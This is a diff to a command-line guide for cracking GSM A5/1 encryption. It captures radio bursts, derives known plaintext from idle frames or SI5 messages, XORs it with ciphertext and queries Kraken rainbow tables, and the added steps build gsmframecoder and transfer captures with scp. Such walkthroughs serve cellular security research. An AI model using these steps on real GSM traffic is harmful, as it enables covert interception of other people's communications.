@@ -18,7 +18,14 @@ Few packages for stage 1
 
         apt install python3 tcpdump tshark gr-gsm -y
 
-Optionally `gsmframedecoder` when dealing with SI5,6 instead of idling frames, but then you would also need the legacy Airprobe code to get the HEX version of the bursts
+Optionally `gsmframedecoder` when dealing with SI5,6 instead of idle frames, but then you would also need obtain HEX version of the bursts, be it with the old Airprobe or Wireshark
+
+	cd /root/KRAKEN/
+	#git clone https://github.com/flyopenair/gsmframecoder.git
+	wget http://www.ks.uni-freiburg.de/download/misc/gsmframecoder.tar.gz
+	tar xzf gsmframecoder.tar.gz
+	cd gsmframecoder/
+	g++ BitVector.cpp GSMFrameCoder2.cpp -o gsmframecoder
 
 And of course Kraken with ready to serve rainbow table indexes
 
@@ -66,19 +73,27 @@ Now seek for idling frames around the Ciphering Mode Command
 
 	plainframe=
 
-Also have a look at Timing Advance in case it is not `x00` already.
-
 Eventually send the bitstring file to the Kraken server.
 
-	scp ~/capture/$arfcn.cfile.${slot}S kraken:/root/capture/
+        scp ~/capture/$arfcn.cfile.${slot}S$sub kraken:~/capture/
+
+## Stage 1.5 - SI5 Timing Advance
+
+_skip this step for idling frame_
+
+Have a look at Timing Advance and in case it is not `x00` already, copy/paste the HEX from wireshark starting at SACCH L1 Header (23 bytes).  Look byte offset `1`.  This will become `x00` and converted to bitstrings thanks to gsmframedecoder.
+
+	/root/KRAKEN/gsmframecoder/gsmframecoder HEX | grep ^[[:digit:]] > /root/capture/si5
 
 ## Stage 2 - define the cipher-text frames
 
 _requires Kraken and the bitstring file_
 
+Make sure the variables are still defined
+
 	screen -S KRAKEN
 	cd /root/KRAKEN/autokraken/stage2/
-	string=/root/capture/$arfcn.cfile.${slot}S
+	string=/root/capture/$arfcn.cfile.${slot}S$sub
 	echo $plainframe
 
 Tune your path against Kraken and Utilities
@@ -87,28 +102,36 @@ Tune your path against Kraken and Utilities
 
 	kraken=/root/KRAKEN/kraken
 
-XOR plain bitstrings with cipher bitstrings
+XOR plain bitstrings with cipher bitstrings for idling frames
 
-	#./getemptyframeplain $cfile.${slot}S $plainframe
-	#./getemptyframecipher $cfile.${slot}S $plainframe
+	echo $cfile $slot $sub $plainframe
+	./getemptyframeplain $cfile.${slot}S$sub $plainframe
+	./getemptyframecipher $cfile.${slot}S$sub $plainframe
 	./feedemptyframe $string $plainframe
 	ls -lhF /root/capture/$arfcn.cfile.1S.*.emptyframe*
 
+--or-- for SI5
+
+	ls -lhF ~/capture/si5
+        echo $string $plainframe
+	./guesssi5 $string $plainframe
+	./feedcrack $string $plainframe
+
 Feed those into Kraken interactivelty
 
-	ls -lhF /dev/sdb2
-	ls -lhF /root/KRAKEN/kraken/indexes/
-	head /root/capture/$arfcn.cfile.${slot}S.$plainframe.emptyframe234
-
 	cd /root/KRAKEN/kraken/Kraken/
-	./kraken ../indexes
+	ls -lhF /dev/sdb2
+	ls -lhF ../indexes/
 
-	crack <xored bitstring>
+Idling frame
 
-## Stage 2 semi-automated
-
-        cd /root/KRAKEN/kraken/Kraken/
+	head /root/capture/$arfcn.cfile.${slot}S.$plainframe.emptyframe234
         ./kraken ../indexes < /root/capture/$arfcn.cfile.${slot}S.$plainframe.emptyframe234
+
+SI5
+
+	head /root/capture/crackxors
+        ./kraken ../indexes < /root/capture/crackxors
 
 ## Stage 2 automated
 
